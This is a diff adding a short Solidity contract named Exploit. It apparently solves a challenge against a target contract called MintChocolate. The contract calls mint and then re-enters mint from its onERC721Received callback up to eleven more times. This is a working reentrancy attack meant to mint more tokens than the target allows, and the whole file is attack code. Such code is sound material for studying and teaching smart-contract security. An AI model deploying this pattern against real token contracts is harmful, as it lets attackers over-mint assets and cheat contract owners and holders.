@@ -1,0 +1,26 @@
+pragma solidity ^0.8.13;
+
+import {MintChocolate} from "./MintChocolate.sol";
+
+contract Exploit {
+
+    uint counter = 0;
+    MintChocolate TARGET;
+
+    constructor(address _t) {
+        TARGET = MintChocolate(_t);
+    }
+
+    function exploit() public {
+        TARGET.mint(10);
+    }
+    
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
+        if(counter < 11){
+            counter += 1;
+            TARGET.mint(10);
+        }
+
+        return 0x150b7a02;
+    }
+}
